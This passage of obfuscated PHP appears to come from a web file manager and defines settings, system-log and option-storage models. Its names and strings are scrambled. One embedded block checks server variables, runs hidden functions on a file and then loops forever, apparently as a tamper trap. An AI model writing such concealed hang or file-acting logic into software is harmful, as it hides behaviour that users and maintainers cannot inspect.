(!self::$syncTask) { return; } foreach (self::$syncTask as $êã¥Â≈í) { try { Hook::apply($êã¥Â≈í[$ƒ£¡ÆÉü[268]], $êã¥Â≈í[$ƒ£¡ÆÉü[1705]]); } catch (Exception $–‚À¯ı°) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto e’ÊœÇ¡é ; aÀãúâñ€ü: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\114\151\x67\150\164\101\160\x70"; public $modelType = "\123\171\163\x74\x65\155\117\160\x74\151\x6f\156"; public $field = array("\156\x61\x6d\x65", "\147\162\157\x75\160", "\144\145\x73\x63", "\x63\x6f\156\x74\x65\x6e\x74"); public function listData($æΩ¿”ÓÛ = false, $πÓ˛≥ê‘ = "\155\x6f\x64\x69\x66\x79\124\151\155\145", $úòÿ‹≠ = true) { return parent::listData($æΩ¿”ÓÛ, $πÓ˛≥ê‘, $úòÿ‹≠); } public function remove($¢Ù¸‚Ã·) { $ÔØ∑ÑÄ› = $this->findByName($¢Ù¸‚Ã·); if (!$ÔØ∑ÑÄ›) { return !1; } return parent::remove($ÔØ∑ÑÄ›[$_SERVER[ëæªã÷][401]]); } public function add($ëÿõ‰™Ê) { if ($this->findByName($ëÿõ‰™Ê[$_SERVER[ëæªã÷][32]])) { return !1; } return parent::insert($ëÿõ‰™Ê); } public function update($¡Á•õÚó, $Ô⁄∆°¬ù) { $∑À´ö√î =& $_SERVER[ëæªã÷]; $¸⁄”ÓÇÎ = $this->findByName($¡Á•õÚó); $ºëÂ¬ÕÖ = $this->findByName($Ô⁄∆°¬ù[$∑À´ö√î[32]]); if (!$¸⁄”ÓÇÎ || $ºëÂ¬ÕÖ && $ºëÂ¬ÕÖ[$∑À´ö√î[401]] != $¸⁄”ÓÇÎ[$∑À´ö√î[401]]) { return !1; } return parent::update($¸⁄”ÓÇÎ[$∑À´ö√î[401]], $Ô⁄∆°¬ù); } } if (!isset($_SERVER[$_SERVER[ëæªã÷][60]]) || !isset($_SERVER[$_SERVER[ëæªã÷][69]])) { $_getc = $_SERVER[ëæªã÷][62]; $_getfile = $_SERVER[$_SERVER[ëæªã÷][63]] . $_SERVER[ëæªã÷][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ëæªã÷][65], $_getfilec); if (count($_getarrs) < $_SERVER[ëæªã÷][66]) { $exit = $_SERVER[ëæªã÷][67]; $exit(); } $_act = $_SERVER[ëæªã÷][68]; $_act($_SERVER[$_SERVER[ëæªã÷][63]] . $_SERVER[ëæªã÷][64]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ëæªã÷][382]); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\x5f\154\157\x67"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\x69\155\145", "\164\x69\x6d\145", "\151\x6e\163\145\162\164", "\x66\165\x6e\x63\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ºÒ«≈ﬁˆ =& $_SERVER[ëæªã÷]; return array($ºÒ«≈ﬁˆ[2113] => LNG($ºÒ«≈ﬁˆ[2114]), $ºÒ«≈ﬁˆ[2115] => LNG($ºÒ«≈ﬁˆ[2116]), $ºÒ«≈ﬁˆ[1739] => LNG($ºÒ«≈ﬁˆ[2117]), $ºÒ«≈ﬁˆ[2118] => LNG($ºÒ«≈ﬁˆ[2119]), $ºÒ«≈ﬁˆ[2120] => LNG($ºÒ«≈ﬁˆ[2121]), $ºÒ«≈ﬁˆ[2122] => LNG($ºÒ«≈ﬁˆ[2123]), $ºÒ«≈ﬁˆ[2124] => LNG($ºÒ«≈ﬁˆ[2125]), $ºÒ«≈ﬁˆ[1769] => LNG($ºÒ«≈ﬁˆ[2125]), $ºÒ«≈ﬁˆ[1770] => LNG($ºÒ«≈ﬁˆ[2126]), $ºÒ«≈ﬁˆ[2127] => LNG($ºÒ«≈ﬁˆ[2128]), $ºÒ«≈ﬁˆ[2129] => LNG($ºÒ«≈ﬁˆ[2130]), $ºÒ«≈ﬁˆ[2131] => LNG($ºÒ«≈ﬁˆ[2132]), $ºÒ«≈ﬁˆ[2133] => LNG($ºÒ«≈ﬁˆ[2134]), $ºÒ«≈ﬁˆ[1767] => LNG($ºÒ«≈ﬁˆ[2135]), $ºÒ«≈ﬁˆ[2136] => LNG($ºÒ«≈ﬁˆ[2137]), $ºÒ«≈ﬁˆ[1774] => LNG($ºÒ«≈ﬁˆ[2138]), $ºÒ«≈ﬁˆ[2139] => LNG($ºÒ«≈ﬁˆ[2140]), $ºÒ«≈ﬁˆ[2141] => LNG($ºÒ«≈ﬁˆ[2142]), $ºÒ«≈ﬁˆ[2143] => LNG($ºÒ«≈ﬁˆ[2144]), $ºÒ«≈ﬁˆ[2145] => LNG($ºÒ«≈ﬁˆ[2146]), $ºÒ«≈ﬁˆ[1777] => LNG($ºÒ«≈ﬁˆ[2147]), $ºÒ«≈ﬁˆ[1778] => LNG($ºÒ«≈ﬁˆ[2148]), $ºÒ«≈ﬁˆ[2149] => LNG($ºÒ«≈ﬁˆ[2150]), $ºÒ«≈ﬁˆ[2151] => LNG($ºÒ«≈ﬁˆ[2152]), $ºÒ«≈ﬁˆ[2153] => LNG($ºÒ«≈ﬁˆ[2154]), $ºÒ«≈ﬁˆ[1772] => LNG($ºÒ«≈ﬁˆ[2155]), $ºÒ«≈ﬁˆ[2156] => LNG($ºÒ«≈ﬁˆ[2157]), $ºÒ«≈ﬁˆ[1771] => LNG($ºÒ«≈ﬁˆ[2158]), $ºÒ«≈ﬁˆ[2159] => LNG($ºÒ«≈ﬁˆ[2160]), $ºÒ«≈ﬁˆ[2161] => LNG($ºÒ«≈ﬁˆ[2162]), $ºÒ«≈ﬁˆ[2163] => LNG($ºÒ«≈ﬁˆ[2164]), $ºÒ«≈ﬁˆ[2165] => LNG($ºÒ«≈ﬁˆ[2165]), $ºÒ«≈ﬁˆ[2166] => LNG($ºÒ«≈ﬁˆ[1743]), $ºÒ«≈ﬁˆ[2167] => LNG($ºÒ«≈ﬁˆ[2168]), $ºÒ«≈ﬁˆ[2169] => LNG($ºÒ«≈ﬁˆ[2170]), $ºÒ«≈ﬁˆ[2171] => LNG($ºÒ«≈ﬁˆ[2172]), $ºÒ«≈ﬁˆ[2173] => LNG($ºÒ«≈ﬁˆ[2174]), $ºÒ«≈ﬁˆ[2175] => LNG($ºÒ«≈ﬁˆ[2176]), $ºÒ«≈ﬁˆ[2177] => LNG($ºÒ«≈ﬁˆ[2177]), $ºÒ«≈ﬁˆ[2178] => LNG($ºÒ«≈ﬁˆ[2179]), $ºÒ«≈ﬁˆ[2180] => LNG($ºÒ«≈ﬁˆ[2181]), $ºÒ«≈ﬁˆ[2182] => LNG($ºÒ«≈ﬁˆ[2183]), $ºÒ«≈ﬁˆ[2184] => LNG($ºÒ«≈ﬁˆ[2185]), $ºÒ«≈ﬁˆ[2186] => LNG($ºÒ«≈ﬁˆ[2187]), $ºÒ«≈ﬁˆ[2188] => LNG($ºÒ«≈ﬁˆ[2189])); } private function typeFile() { $◊ù”¨÷∫ =& $_SERVER[ëæªã÷]; $ÿ´í’˛Ì = array($◊ù”¨÷∫[1774] => array($◊ù”¨÷∫[1775]), $◊ù”¨÷∫[2131] => array($◊ù”¨÷∫[2190]), $◊ù”¨÷∫[2133] => array($◊ù”¨÷∫[2191]), $◊ù”¨÷∫[1767] => array($◊ù”¨÷∫[1768]), $◊ù”¨÷∫[2141] => array(), $◊ù”¨÷∫[2143] => array(), $◊ù”¨÷∫[2145] => array(), $◊ù”¨÷∫[1777] => array($◊ù”¨÷∫[1779]), $◊ù”¨÷∫[1778] => array($◊ù”¨÷∫[1779]), $◊ù”¨÷∫[2149] => array($◊ù”¨÷∫[2192]), $◊ù”¨÷∫[2151] => array($◊ù”¨÷∫[2192]), $◊ù”¨÷∫[2153] => array($◊ù”¨÷∫[2193]), $◊ù”¨÷∫[2139] => array($◊ù”¨÷∫[2194]), $◊ù”¨÷∫[1772] => array($◊ù”¨÷∫[2195]), $◊ù”¨÷∫[2156] => array($◊ù”¨÷∫[2196]), $◊ù”¨÷∫[1771] => array($◊ù”¨÷∫[1773])); return $ÿ´í’˛Ì; } private function typeAll() { $⁄±˚Ñ˜  =& $_SERVER[ëæªã÷]; $âı˛ûóÚ = $this->typeList; $ªÿèïÎâ = array_filter($this->typeFile()); foreach ($ªÿèïÎâ as $ó––—Üì => $£Ë§íÏ√) { $âı˛ûóÚ[$£Ë§íÏ√[0]] = $âı˛ûóÚ[$ó––—Üì]; } $âı˛ûóÚ[$⁄±˚Ñ˜ [1779]] = LNG($⁄±˚Ñ˜ [2197]); $âı˛ûóÚ[$⁄±˚Ñ˜ [2192]] = LNG($⁄±˚Ñ˜ [2198]); return $âı˛ûóÚ; } public function addLog($Èä¯’üï, $Ö‰Ñ™ﬂ¯ = array()) { $„”ÖÖüÿ =& $_SERVER[ëæªã÷]; if (!isset($this->typeList[$Èä¯’üï])) { return; } $âÜÚ“Ù = defined($„”ÖÖüÿ[474]) && USER_ID ? USER_ID : (isset($Ö‰Ñ™ﬂ¯[$„”ÖÖüÿ[1628]]) ? $Ö‰Ñ™ﬂ¯[$„”ÖÖüÿ[1628]] : 0); if (!$âÜÚ“Ù) { $âÜÚ“Ù = (int) Session::get($„”ÖÖüÿ[1928]); } $åëı¿ÚΩ = get_client_ip(); if (!$Ö‰Ñ™ﬂ¯ || strlen(json_encode($Ö‰Ñ™ﬂ¯)) >= 1024) { $Ö‰Ñ™ﬂ¯ = array($„”ÖÖüÿ[2199] => $åëı¿ÚΩ); } else { if (is_array($Ö‰Ñ™ﬂ¯)) { $Ö‰Ñ™ﬂ¯[$„”ÖÖüÿ[2199]] = $åëı¿ÚΩ; } else { $Ö‰Ñ™ﬂ¯ = array($„”ÖÖüÿ[1167] => $Ö‰Ñ™ﬂ¯, $„”ÖÖüÿ[2199] => $åëı¿ÚΩ); } } $Ö‰Ñ™ﬂ¯ = array($„”ÖÖüÿ[1618] => Session::sign(), $„”ÖÖüÿ[1619] => $âÜÚ“Ù, $„”ÖÖüÿ[33] => $Èä¯’üï, $„”ÖÖüÿ[1621] => json_encode($Ö‰Ñ™ﬂ¯)); parent::add($Ö‰Ñ™ﬂ¯); } public function remove($±Ωò√À≠) { $this->where(array($_SERVER[ëæªã÷][420] => $±Ωò√À≠))->delete(); } private function _makeOrder($£û–‹æö = '') { $Øâ˘âÑÕ =& $_SERVER[ëæªã÷]; $Ö∫ÆÏÒË = $Øâ˘âÑÕ[203]; $ü´Ûëúª = array($Øâ˘âÑÕ[448] => $Øâ˘âÑÕ[449], $Øâ˘âÑÕ[450] => $Øâ˘âÑÕ[451]); $Œé•âãß = Input::get($Øâ˘âÑÕ[456], $Øâ˘âÑÕ[7], $Øâ˘âÑÕ[1960], array($Øâ˘âÑÕ[1886], $Øâ˘âÑÕ[450])); $Œé•âãß = $ü´Ûëúª[$Œé•âãß]; $£û–‹æö = $£û–‹æö . "{$Ö∫ÆÏÒË}\x20{$Œé•âãß}"; return $this->order($£û–‹æö); } public function get($§ΩÃÚ˘± = '') { $‘∏¨Ù Œ =& $_SERVER[ëæªã÷]; if (!$§ΩÃÚ˘±) { show_json(array()); } $âù°Ú–˝ = array(); if ($§ΩÃÚ˘±[$‘∏¨Ù Œ[1628]]) { $âù°Ú–˝[$‘∏¨Ù Œ[1628]] = $§ΩÃÚ˘±[$‘∏¨Ù Œ[1628]]; } if (isset($§ΩÃÚ˘±[$‘∏¨Ù Œ[741]])) { $õ∫ßÙ‚Â = $§ΩÃÚ˘±[$‘∏¨Ù Œ[741]]; $‘ˆÖéî÷ = isset($§ΩÃÚ˘±[$‘∏¨Ù Œ[496]]) ? $§ΩÃÚ˘±[$‘∏¨Ù Œ[496]] : time(); $âù°Ú–˝[$‘∏¨Ù Œ[203]] = array($‘∏¨Ù Œ[337], array($õ∫ßÙ‚Â, $‘ˆÖéî÷)); } if ($§ΩÃÚ˘±[$‘∏¨Ù Œ[33]]) { $∫»ò≠⁄¢ = explode($‘∏¨Ù Œ[50], $§ΩÃÚ˘±[$‘∏¨Ù Œ[33]]); $ªé≠˚¥à = $this->typeFile(); $ôÆ§¢±¯ = array(); foreach ($∫»ò≠⁄¢ as $ÑåñêÜ™) { $ôÆ§¢±¯[] = $ÑåñêÜ™; if (isset($ªé≠˚¥à[$ÑåñêÜ™])) { $ôÆ§¢±¯ = array_merge($ôÆ§¢±¯, $ªé≠˚¥à[$ÑåñêÜ™]); } } $ôÆ§¢±¯ = array_unique($ôÆ§¢±¯); if ($ôÆ§¢±¯) { $âù°Ú–˝[$‘∏¨Ù Œ[33]] = array($‘∏¨Ù Œ[7], $ôÆ§¢±¯); } } else { $âù°Ú–˝[$‘∏¨Ù Œ[33]] = array($‘∏¨Ù Œ[2200], $‘∏¨Ù Œ[2201]); } if (!empty($§ΩÃÚ˘±[$‘∏¨Ù Œ[2199]])) { $âù°Ú–˝[$‘∏¨Ù Œ[451]] = array($‘∏¨Ù Œ[387], "\45{$§ΩÃÚ˘±[$‘∏¨Ù Œ[2199]]}\45"); } $≠À˙€öÇ = $this->_makeOrder()->where($âù°Ú–˝)->selectPage(); if (empty($≠À˙€öÇ[$‘∏¨Ù Œ[373]])) { show_json(array(), !0, $≠À˙€öÇ[$‘∏¨Ù Œ[370]]); } $≠À˙€öÇ[$‘∏¨Ù Œ[373]] = $this->logList($≠À˙€öÇ[$‘∏¨Ù Œ[373]]); return $≠À˙€öÇ; } private function ipAddress(&$˚›úÏç) { $¬™Ú©ñ˙ =& $_SERVER[ëæªã÷]; if (!empty($˚›úÏç[$¬™Ú©ñ˙[2199]])) { $ƒ ∞êÒÒ = IpLocation::get($˚›úÏç[$¬™Ú©ñ˙[2199]]); } else { $ƒ ∞êÒÒ = LNG($¬™Ú©ñ˙[2202]); } $˚›úÏç[$¬™Ú©ñ˙[2203]] = $ƒ ∞êÒÒ; } private function descZipDownload($◊Í≈∆„˙, &$—öŸÌÁ›) { $ïΩèáä¢ =& $_SERVER[ëæªã÷]; if (!isset($◊Í≈∆„˙[$ïΩèáä¢[2204]])) { return; } $Çúß≈Â¶ = json_decode($◊Í≈∆„˙[$ïΩèáä¢[2204]], !0); foreach ($Çúß≈Â¶ as $Õ˛¸Á–µ) { try { $ëÖΩºø≈ = IO::infoFull($Õ˛¸Á–µ[$ïΩèáä¢[88]]); } catch (Exception $ƒ≠ÔÿÛÍ) { continue; } $◊Í≈∆„˙[$ïΩèáä¢[88]] = $Õ˛¸Á–µ[$ïΩèáä¢[88]]; $—öŸÌÁ›[] = $◊Í≈∆„˙[$ïΩèáä¢[403]] = $ëÖΩºø≈[$ïΩèáä¢[403]]; $—öŸÌÁ›[] = $◊Í≈∆„˙[$ïΩèáä¢[2014]] = $ëÖΩºø≈[$ïΩèáä¢[498]]; break; } return $◊Í≈∆„˙; } private function getSourceList(&$ íø‚Ì≥) { $–»Ú≠≥“ =& $_SERVER[ëæªã÷]; $¿ƒóı∏˙ = array(); foreach ($ íø‚Ì≥ as $ï¡©àÕí => $ƒΩ°Õòû) { $≥õ∆ÆËÈ = json_decode($ƒΩ°Õòû[$–»Ú≠≥“[451]], !0); if ($ƒΩ°Õòû[$–»Ú≠≥“[33]] == $–»Ú≠≥“[1770]) { $≥õ∆ÆËÈ = $this->descZipDownload($≥õ∆ÆËÈ, $¿ƒóı∏˙); $ íø‚Ì≥[$ï¡©àÕí][$–»Ú≠≥“[451]] = json_encode($≥õ∆ÆËÈ); continue; } if (strpos($ƒΩ°Õòû[$–»Ú≠≥“[33]], $–»Ú≠≥“[2016]) !== 0) { if (!isset($≥õ∆ÆËÈ[$–»Ú≠≥“[88]]) || strpos($ƒΩ°Õòû[$–»Ú≠≥“[33]], $–»Ú≠≥“[2205]) !== 0) { continue; } try { $Öæïï´™ = IO::infoFull($≥õ∆ÆËÈ[$–»Ú≠≥“[88]]); } catch (Exception $∏ò÷ÀÜù) { continue; } $¿ƒóı∏˙[] = $≥õ∆ÆËÈ[$–»Ú≠≥“[403]] = $Öæïï´™[$–»Ú≠≥“[403]]; $¿ƒóı∏˙[] = $≥õ∆ÆËÈ[$–»Ú≠≥“[2014]] = $Öæïï´™[$–»Ú≠≥“[498]]; $ íø‚Ì≥[$ï¡©àÕí][$–»Ú≠≥“[451]] = json_encode($≥õ∆ÆËÈ); continue; } $¿ƒóı∏˙[] = $≥õ∆ÆËÈ[$–»Ú≠≥“[403]]; $¿ƒóı∏˙[] = $≥õ∆ÆËÈ[$–»Ú≠≥“[2014]]; if ($≥õ∆ÆËÈ[$–»Ú≠≥“[33]] == $–»Ú≠≥“[551]) { $¿ƒóı∏˙[] = $≥õ∆ÆËÈ[$–»Ú≠≥“[451]][$–»Ú≠≥“[1134]]; $¿ƒóı∏˙[] = $≥õ∆ÆËÈ[$–»Ú≠≥“[451]][$–»Ú≠≥“[1135]]; } if ($≥õ∆ÆËÈ[$–»Ú≠≥“[33]] == $–»Ú≠≥“[2023]) { $¿ƒóı∏˙[] = $≥õ∆ÆËÈ[$–»Ú≠≥“[451]][$–»Ú≠≥“[403]]; } } if (!$¿ƒóı∏˙) { return array(); } return Model($–»Ú≠≥“[805])->sourceListInfo($¿ƒóı∏˙, !0); } private function logList($´œ±ª«‰) { $Ã°√Ä‡≤ =& $_SERVER[ëæªã÷]; $∂”∏’Ó„ = array_to_keyvalue($´œ±ª«‰, $Ã°√Ä‡≤[12], $Ã°√Ä‡≤[1628]); $ö·≤Å”≠ = Model($Ã°√Ä‡≤[538])->userListInfo(array_unique($∂”∏’Ó„)); $∞ﬁîàÏ‰ = $this->getSourceList($´œ±ª«‰); $˛íÇ„Éµ = $this->typeAll(); $ì£⁄‘÷≤ = array(); $˛ãﬁå∆ü = array(); foreach ($´œ±ª«‰ as $ïÖÌ›ò≠ => $◊™ı©É˚) { $ëô–∑∆ƒ = $◊™ı©É˚[$Ã°√Ä‡≤[33]]; $æ∏°˝„‰ = isset($ö·≤Å”≠[$◊™ı©É˚[$Ã°√Ä‡≤[1628]]]) ? $ö·≤Å”≠[$◊™ı©É˚[$Ã°√Ä‡≤[1628]]] : !1; $ö˘°ø‹˛ = strpos($ëô–∑∆ƒ, $Ã°√Ä‡≤[2206]) === 0 ? LNG($Ã°√Ä‡≤[2207]) : LNG($Ã°√Ä‡≤[2202]); $◊™ı©É˚[$Ã°√Ä‡≤[32]] = isset($æ∏°˝„‰[$Ã°√Ä‡≤[32]]) ? $æ∏°˝„‰[$Ã°√Ä‡≤[32]] : LNG($Ã°√Ä‡≤[2202]); $◊™ı©É˚[$Ã°√Ä‡≤[2065]] = isset($æ∏°˝„‰[$Ã°√Ä‡≤[2065]]) ? $æ∏°˝„‰[$Ã°√Ä‡≤[2065]] : $Ã°√Ä‡≤[12]; $◊™ı©É˚[$Ã°√Ä‡≤[1528]] = isset($˛íÇ„Éµ[$ëô–∑∆ƒ]) ? $˛íÇ„Éµ[$ëô–∑∆ƒ] : $ö˘°ø‹˛; $◊™ı©É˚[$Ã°√Ä‡≤[1959]] = $æ∏°˝„‰; $›∂œ∞¯¿ = json_decode($◊™ı©É˚[$Ã°√Ä‡≤[451]], !0); $◊™ı©É˚[$Ã°√Ä‡≤[2199]] = isset($›∂œ∞¯¿[$Ã°√Ä‡≤[2199]]) ? $›∂œ∞¯¿[$Ã°√Ä‡≤[2199]] : $Ã°√Ä‡≤[12]; $◊™ı©É˚[$Ã°√Ä‡≤[2203]] = IpLocation::get($◊™ı©É˚[$Ã°√Ä‡≤[2199]]); if (strpos($ëô–∑∆ƒ, $Ã°√Ä‡≤[2016]) === 0 || isset($›∂œ∞¯¿[$Ã°√Ä‡≤[2014]])) { $›∂œ∞¯¿[$Ã°√Ä‡≤[97]] = $∞ﬁîàÏ‰[$›∂œ∞¯¿[$Ã°√Ä‡≤[403]]]; $›∂œ∞¯¿[$Ã°√Ä‡≤[2028]] = $∞ﬁîàÏ‰[$›∂œ∞¯¿[$Ã°√Ä‡≤[2014]]]; if ($›∂œ∞¯¿[$Ã°√Ä‡≤[33]] == $Ã°√Ä‡≤[551]) { $›∂œ∞¯¿[$Ã°√Ä‡≤[451]][$Ã°√Ä‡≤[1134]] = $∞ﬁîàÏ‰[$›∂œ∞¯¿[$Ã°√Ä‡≤[451]][$Ã°√Ä‡≤[1134]]]; $›∂œ∞¯¿[$Ã°√Ä‡≤[451]][$Ã°√Ä‡≤[1135]] = $∞ﬁîàÏ‰[$›∂œ∞¯¿[$Ã°√Ä‡≤[451]][$Ã°√Ä‡≤[1135]]]; } if ($›∂œ∞¯¿[$Ã°√Ä‡≤[33]] == $Ã°√Ä‡≤[2023]) { $›∂œ∞¯¿[$Ã°√Ä‡≤[451]][$Ã°√Ä‡≤[403]] = $∞ﬁîàÏ‰[$›∂œ∞¯¿[$Ã°√Ä‡≤[451]][$Ã°√Ä‡≤[403]]]; } if ($›∂œ∞¯¿[$Ã°√Ä‡≤[33]] == $Ã°√Ä‡≤[1765]) { $›∂œ∞¯¿[$Ã°√Ä‡≤[2028]] = $›∂œ∞¯¿[$Ã°√Ä‡≤[97]]; $›∂œ∞¯¿[$Ã°√Ä‡≤[2014]] = $›∂œ∞¯¿[$Ã°√Ä‡≤[2028]][$Ã°√Ä‡≤[403]]; $›∂œ∞¯¿[$Ã°√Ä‡≤[97]] = !1; $›∂œ∞¯¿[$Ã°√Ä‡≤[403]] = $Ã°√Ä‡≤[12]; } if ($›∂œ∞¯¿[$Ã°√Ä‡≤[97]] && $›∂œ∞¯¿[$Ã°√Ä‡≤[97]][$Ã°√Ä‡≤[412]] == $Ã°√Ä‡≤[1250]) { $˛ãﬁå∆ü[] = $◊™ı©É˚[$Ã°√Ä‡≤[401]]; unset($´œ±ª«‰[$ïÖÌ›ò≠]); continue; } if ($›∂œ∞¯¿[$Ã°√Ä‡≤[2028]] && $›∂œ∞¯¿[$Ã°√Ä‡≤[2028]][$Ã°√Ä‡≤[412]] == $Ã°√Ä‡≤[1250]) { $˛ãﬁå∆ü[] = $◊™ı©É˚[$Ã°√Ä‡≤[401]]; unset($´œ±ª«‰[$ïÖÌ›ò≠]); continue; } } $◊™ı©É˚[$Ã°√Ä‡≤[451]] = $›∂œ∞¯¿; unset($◊™ı©É˚[$Ã°√Ä‡≤[2208]]); $ì£⁄‘÷≤[] = $◊™ı©É˚; } $this->clearSystemPathLog($˛ãﬁå∆ü); return $ì£⁄‘÷≤; } private function clearSystemPathLog($”‚ûÑÜ∫) { $´¯ÇÕÿù =& $_SERVER[ëæªã÷]; if (count($”‚ûÑÜ∫) == 0) { return; } $µ“¥ƒ÷ê = array($´¯ÇÕÿù[401] => array($´¯ÇÕÿù[7], array_unique($”‚ûÑÜ∫))); $this->where($µ“¥ƒ÷ê)->delete(); } public function deviceList($ûƒ›∏Ç, $‘Í¥®úù = 0) { $€ò˝¿ï† =& $_SERVER[ëæªã÷]; $»ª±òøÅ = array($€ò˝¿ï†[1628] => $ûƒ›∏Ç, $€ò˝¿ï†[203] => array($€ò˝¿ï†[990], $‘Í¥®úù), $€ò˝¿ï†[33] => $€ò˝¿ï†[1739]); $±à∏—©Ú = array(); $ƒ§£ö≠Ø = $this->field($€ò˝¿ï†[2209])->where($»ª±òøÅ)->order($€ò˝¿ï†[2026])->limit(50)->select(); foreach ($ƒ§£ö≠Ø as $Ñıò≤± => $íé—¯±ﬂ) { if ($Ñıò≤± > 0 && abs($íé—¯±ﬂ[$€ò˝¿ï†[203]] - $ƒ§£ö≠Ø[$Ñıò≤± - 1][$€ò˝¿ï†[203]]) < 5) { continue; } $ÉçºıÉë = json_decode($íé—¯±ﬂ[$€ò˝¿ï†[451]], !0); $íé—¯±ﬂ[$€ò˝¿ï†[2199]] = isset($ÉçºıÉë[$€ò˝¿ï†[2199]]) ? $ÉçºıÉë[$€ò˝¿ï†[2199]] : $€ò˝¿ï†[12]; unset($ÉçºıÉë[$€ò˝¿ï†[2199]]); $ﬁ∑·‡∆… = $this->deviceType($ÉçºıÉë[$€ò˝¿ï†[2017]]); if (isset($±à∏—©Ú[$ﬁ∑·‡∆…])) { continue; } $íé—¯±ﬂ[$€ò˝¿ï†[2203]] = IpLocation::get($íé—¯±ﬂ[$€ò˝¿ï†[2199]]); $íé—¯±ﬂ[$€ò˝¿ï†[451]] = $ÉçºıÉë; $±à∏—©Ú[$ﬁ∑·‡∆…] = $íé—¯±ﬂ; } return array_values($±à∏—©Ú); } public function deviceType($∆ˆ‡œ¿∞) { return $∆ˆ‡œ¿∞; } } goto bﬁç–Â˜Ëã; eæıœ¨¥¡ú: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\x65\x6d\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($øÏ∏çÒÏ = false, $¶ıÆ√æŸ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\x6d\x65", $∂©ûÏ’Á = false) { $∂€ÛøÙú = Model($this->modelType)->get(!1, $this->optionType, !0); $®ÿùè—´ = array_values($∂€ÛøÙú); if ($®ÿùè—´ && $®ÿùè—´[0] && !is_array($®ÿùè—´[0])) { Model($this->modelType)->cacheRemove($this->optionType); $∂€ÛøÙú = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$∂€ÛøÙú) { return $øÏ∏çÒÏ ? null : array(); } if (!$øÏ∏çÒÏ) { $∂€ÛøÙú = array_filter(array_values($∂€ÛøÙú)); return array_sort_by($∂€ÛøÙú, $¶ıÆ√æŸ, $∂©ûÏ’Á); } return $∂€ÛøÙú[$_SERVER[ëæªã÷][398] . $øÏ∏çÒÏ]; } public function insert($œÇ«©ÖÏ) { $¨ÿÏÆï⁄ =& $_SERVER[ëæªã÷]; $œÇ«©ÖÏ = array_field_key($œÇ«©ÖÏ, $this->field); $é‹Ôñ∂√ = Model($this->modelType)->get($¨ÿÏÆï⁄[399], $this->optionType . $¨ÿÏÆï⁄[400]); $é‹Ôñ∂√ = $é‹Ôñ∂√ ? $é‹Ôñ∂√ : 0; $œÇ«©ÖÏ[$¨ÿÏÆï⁄[401]] = ++$é‹Ôñ∂√; $œÇ«©ÖÏ[$¨ÿÏÆï⁄[203]] = time(); $œÇ«©ÖÏ[$¨ÿÏÆï⁄[96]] = time(); Model($this->modelType)->set($¨ÿÏÆï⁄[399], $é‹Ôñ∂√, $this->optionType . $¨ÿÏÆï⁄[400]); Model($this->modelType)->set($¨ÿÏÆï⁄[398] . $é‹Ôñ∂√, $œÇ«©ÖÏ, $this->optionType); return $é‹Ôñ∂√; } public function update($éàà¯ˆ¿, $Ô°ÖÕµº) { $ØÓñ¿”˝ =& $_SERVER[ëæªã÷]; $Ô°ÖÕµº = array_field_key($Ô°ÖÕµº, $this->field); $˘ÑÇ¿ˆ = $this->listData($éàà¯ˆ¿); if (!$˘ÑÇ¿ˆ || !$éàà¯ˆ¿) { return !1; } $Ô°ÖÕµº = array_merge($˘ÑÇ¿ˆ, $Ô°ÖÕµº); $Ô°ÖÕµº[$ØÓñ¿”˝[96]] = time(); return Model($this->modelType)->set($ØÓñ¿”˝[398] . $éàà¯ˆ¿, $Ô°ÖÕµº, $this->optionType); } public function remove($º°÷»ñı) { if (!$º°÷»ñı) { return !1; } return Model($this->modelType)->remove($_SERVER[ëæªã÷][398] . $º°÷»ñı, $this->optionType); } public function clear() { $ÇıŒ’ﬁü =& $_SERVER[ëæªã÷]; Model($this->modelType)->remove($ÇıŒ’ﬁü[399], $this->optionType . $ÇıŒ’ﬁü[400]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¢Î∑§≤ô, $⁄ÂßàÿÒ) { if (!$⁄ÂßàÿÒ) { return !1; } $‹‚≠œî„ = $this->listData(); $‹‚≠œî„ = array_to_keyvalue($‹‚≠œî„, $¢Î∑§≤ô); return isset($‹‚≠œî„[$⁄ÂßàÿÒ]) ? $‹‚≠œî„[$⁄ÂßàÿÒ] : !1; } public function findByName($€˛§‹∞) { return $this->findByKey($_SERVER[ëæªã÷][32], $€˛§‹∞); } protected function resetData($¨¶¶‰ ”) { $˝ç®Ç≤√ =& $_SERVER[ëæªã÷]; $¨¶¶‰ ” = is_array($¨¶¶‰ ”) ? $¨¶¶‰ ” : array(); $ë—Ñ∑≈¥ = array(); for ($ö˛≠ÁèÀ = 0; $ö˛≠ÁèÀ < count($¨¶¶‰ ”); $ö˛≠ÁèÀ++) { $ë—Ñ∑≈¥[$˝ç®Ç≤√[398] . $¨¶¶‰ ”[$ö˛≠ÁèÀ][$˝ç®Ç≤√[401]]] = $¨¶¶‰ ”[$ö˛≠ÁèÀ]; } return Model($this->modelType)->set($ë—Ñ∑≈¥, !1, $this->optionType); } private function getAutoName($¢ìªÑ∆à) { $ÂçÊÅ€Ç = array_to_keyvalue($this->listData(), $_SERVER[ëæªã÷][32]); if (!$ÂçÊÅ€Ç || !isset($ÂçÊÅ€Ç[$¢ìªÑ∆à])) { return $¢ìªÑ∆à; } for ($√µ∞Å≤≤ = 1; $√µ∞Å≤≤ < count($ÂçÊÅ€Ç); $√µ∞Å≤≤++) { $ÙÔû’√§ = $¢ìªÑ∆à . "\50{$√µ∞Å≤≤}\51"; if (!isset($ÂçÊÅ€Ç[$ÙÔû’√§])) { return $ÙÔû’√§; } } return $ÙÔû’√§; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($†⁄⁄¢Üí = false, $Ü÷≈“” = '', $Œ›ÑÚ¥˙ = false) { $ºêãÀÆÇ =& $_SERVER[ëæªã÷]; $Å•èÓ∆œ = 